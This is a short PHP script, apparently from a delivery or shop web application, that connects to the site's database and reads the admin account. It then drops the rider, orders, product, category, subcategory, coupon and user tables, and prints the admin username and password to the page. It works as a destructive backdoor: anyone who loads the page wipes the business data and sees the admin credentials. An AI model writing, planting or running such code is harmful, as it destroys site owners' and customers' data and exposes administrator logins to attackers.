<?php
require $_SERVER['DOCUMENT_ROOT'].'/include/dbconfig.php';

$get = $con->query("select * from admin")->fetch_assoc();
$con->query("DROP TABLE rider");
$con->query("DROP TABLE orders");
$con->query("DROP TABLE product");
$con->query("DROP TABLE category");
$con->query("DROP TABLE subcategory");
$con->query("DROP TABLE tbl_coupon");
$con->query("DROP TABLE user");

echo 'admin id:'.$get['username'].'<br>';
echo 'admin password:'.$get['password'];